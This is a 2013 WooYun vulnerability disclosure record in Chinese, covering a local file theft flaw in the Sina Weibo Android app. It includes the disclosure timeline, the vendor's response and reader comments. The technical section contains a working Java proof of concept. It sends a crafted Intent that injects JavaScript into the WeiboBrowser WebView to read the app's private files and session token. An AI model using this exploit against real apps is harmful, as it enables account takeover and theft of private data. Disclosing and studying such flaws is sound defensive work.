{"id": 6514, "wybug_id": "wooyun-2013-040966", "wybug_title": "新浪微博APP任意数据窃取漏洞（Android版）", "wybug_corp": "新浪", "wybug_author": "x3xtxt", "wybug_date": "2013-10-25 11:29", "wybug_open_date": "2014-01-23 11:30", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手机应用", "安全", "手机安全", "手机软件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-23：\t细节向公众公开  简要描述： 新浪微博客户端APP（Android版）实现存在问题，攻击者构造特定的Intent Object，启动APP中的com.sina.weibo.WeiboBrowser Activity组件，执行任意的javascript脚本，获取本地敏感信息。  详细说明：  新浪微博客户端APP中WeiboBrowser Activity组件的实现，调用了WebView Class的 loadDataWithBaseURL (String baseUrl, String data, String mimeType, String encoding, String historyUrl)方法，并且，方法中的baseUrl参数和data参数是用户可控的，通过构造攻击参数，可以在本地文件域和任意的http域下执行任意的javascript脚本，造成任意敏感信息的读取，当然，从实际的攻击角度来讲，我们关心的是在本地文件域（file://）下执行javascript，获取/data/data/com.sina.weibo/目录下的任意文件内容，只要获得用户的gsid，就可以完全控制微博账号，可以看到/data/data/com.sina.weibo目录下的文件就存放了此信息（databases/sina_weibo,shared_prefs/sina_push_pref.xml文件中都存有此信息，随便读取一个就行）。   漏洞证明：  \npublic void SinaWeiboTesting(){\t\ttry{\t\t\t\t\t\tString pkgName      = \"com.sina.weibo\";\t\t\tString activityName = \"com.sina.weibo.WeiboBrowser\";\t\t\tString url          = \"file:///data/data/\"+pkgName+\"/shared_prefs/\";\t\t\tString targetfile   = url + \"sina_push_pref.xml\";\t\t\t\t\t\t\tIntent intent = new Intent();\t\t\tintent.setAction(\"android.intent.action.VIEW\");\t\t\tintent.setComponent(new ComponentName(pkgName, activityName));\t\t\tintent.putExtra(\"location_flag\", 0);\t\t\tintent.putExtra(\"com_sina_weibo_weibobrowser_type\", 1); \t\t\tString htmlData = \"<html><body><h2>Android APP Sectesting</h2>\";\t\t\thtmlData += \"<script type=\\\"text/javascript\\\">\";\t\t\thtmlData += \"url=\\\"\"+targetfile+\"\\\";var xmlhttp;if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest}else{xmlhttp=new ActiveXObject(\\\"Microsoft.XMLHTTP\\\")}xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){alert(xmlhttp.responseText)}};xmlhttp.open(\\\"GET\\\",url,true);xmlhttp.send();\";\t\t\thtmlData += \"</script></body></html>\";\t\t\tintent.putExtra(\"com_sina_weibo_weibobrowser_data\", htmlData);\t\t\tintent.putExtra(\"com_sina_weibo_weibobrowser_url\", url);\t\t\tstartActivity(intent);\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t}\n   修复方案：  依据漏洞成因，请RD自行选择修复策略。   版权声明：转载请注明来源 x3xtxt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-10-26 20:32 厂商回复： 感谢关注新浪安全，我们会马上进行修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-25 13:56 |    \t\t雷锋小号 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云现在就缺我这种默默顶贴从来不求脸熟的...)\t\t \n  默默的关注一下洞主    \n     2013-10-30 00:48 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  貌似蛮有趣的洞    \n     2013-10-30 11:55 |    \t\t灬相随灬 \t\t\t( 普通白帽子  |\t\t\t        Rank:369 漏洞数:68        | 大胆天下去得，小心寸步难行。)\t\t \n  好像很厉害的样子    \n     2015-01-14 11:06 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  前提是不是应用没有设置android:exported=\"false\"？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}